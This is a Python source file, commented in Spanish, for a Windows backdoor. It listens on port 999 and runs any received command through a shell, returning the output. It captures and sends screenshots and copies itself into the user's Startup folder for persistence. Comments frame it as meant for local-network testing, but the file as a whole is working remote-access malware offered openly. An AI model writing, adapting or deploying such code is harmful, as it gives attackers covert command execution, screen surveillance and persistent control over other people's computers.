
import subprocess
import socket
import os
import threading
import platform
import re
import sys
from pyautogui import screenshot

# codigo para puerta trasera (solo windows)
# pensado solo para ejecucion dentro de la red local, el equipo en este caso es el que va a actuar como server
# no esta preparado para escuchar fuera de la red privada, no recomiendo
# "Estamos hack" - Autor: Matias Urbaneja (Urb@n) - # https://github.com/Urban20

def capturar_pant():
    try:
        nombre_img = 'ss.jpg'
        img= screenshot()
        #img = img.resize((1920,1080))
        img.save(nombre_img,)
        
        with open(nombre_img,'rb') as img_arch:
            imagen = img_arch.read()
        os.remove(nombre_img)
        return imagen
    except: pass

nombre_exe = re.search(r'(\w+\.pyw?)|(\w+\.exe)',sys.argv[0]).group() # nombre que tendra el ejecutable, debe coincidir o la operacion mover_dir() falla

def mover_dir(): # mover ejecutable al startup
    'intenta mover el ejecutable a la ruta de startup de windows, si falla imprime el error en consola (si esta habilitada) y el codigo continua'
    try:
        os.rename(f'{os.getcwd()}\\{nombre_exe}',f'{os.environ.get('USERPROFILE')}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{nombre_exe}')

    except Exception as e: print(f'hubo un error al mover el exe: {e}') # para verlo en consola en caso de que no ande (pensado en entornos de prueba)

def IPV4():
    'intenta obtener la direccion ipv4 de la maquina'
    try:
        
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect(('10.255.255.255',1))
        return s.getsockname()[0]

    except:
        print('error obteniendo ipv4')
        exit(1)

def escucha(cliente):
    'interpreta los comandos recibidos'
    try:
        while True:
            señal = cliente.recv(1024).decode()
            if re.match('cd ',señal.lower()):
                ruta = señal[2:].strip()
                try:
                    os.chdir(ruta.strip())

                    cliente.send(f'\n[!] nueva ruta>> {ruta}\n'.encode())

                except Exception as e:
                    cliente.send(f'\n[!] error cambiando el directorio de trabajo:\n{e}\n'.encode())
                    
            elif señal == 'ss':
                
                try:
                    byte = capturar_pant()
                    cliente.sendall(len(byte).to_bytes(length=8,byteorder="big")) # tamaño de img : int a bytes , debe coincidir del otro lado
                    cliente.send(byte) # envia la imagen en bytes

                except: cliente.sendall('fallo al enviar imagen'.encode())
            

            else:
                comando = subprocess.check_output(señal.split(' '),text=True,shell=True) # comando recibido por el cliente
                cliente.send(comando.encode()) # envio de la salida del backdoor al cliente
    except ConnectionResetError:
        main()
    except:
        cliente.send('\n[!] error durante la ejecucion del comando\n'.encode())

def main():

    'funcion principal del codigo'

    n = 0
    while ejecucion:
        try:
            

            s.listen()
            cliente,sv=s.accept()
            if n == 0:
                os.chdir(f'{os.environ.get('USERPROFILE')}\\Desktop')
                print('\n[*] conectado\n')
            threading.Thread(target=escucha,args=(cliente,)).start()

        except Exception as e:
            cliente.send(f'\n[!] no se pudo procesar el comando {e})\n'.encode())
            main()
        finally:
            n=1

if __name__ == '__main__' and platform.system() == 'Windows':
    mover_dir()

    puerto = 999
    ip = IPV4()
    s = socket.socket()
    s.bind((ip,puerto))
    ejecucion = True
    try:
        main()
    except Exception as e:
        print(f'hubo un error: {e}')
        exit(0)